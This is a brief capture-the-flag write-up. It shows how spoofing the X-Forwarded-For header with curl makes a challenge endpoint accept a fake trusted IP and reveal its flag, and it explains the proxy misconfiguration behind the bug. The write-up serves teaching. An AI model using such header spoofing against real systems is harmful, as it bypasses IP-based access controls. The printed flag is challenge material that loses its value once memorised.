# Solution - by bashNinja
When you curl the page, it gives you this:

```
$ curl https://ywihmdxlya.execute-api.us-west-2.amazonaws.com/default/myFun2020_001
"Trusted Source IP Address Lookup!"
```

The solution to this is to trick it into thinking you're coming from something else. This isn't faking the TCP level, but messing with the HTTP level.

```
$ curl -H "X-Forwarded-For: 10.10.10.10" https://ywihmdxlya.execute-api.us-west-2.amazonaws.com/default/myFun2020_001
"Trusted Source IP Address Lookup! IP: 10.10.10.10 FLAG: againSOLDsoon"
```

# Real Life Application

When items are hidden behind proxies and CDNs, the final server needs to know how to tell what the real client IP is.

If the server is configured incorrectly, this bug can appear.

More Info:

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For

# Flag

againSOLDsoon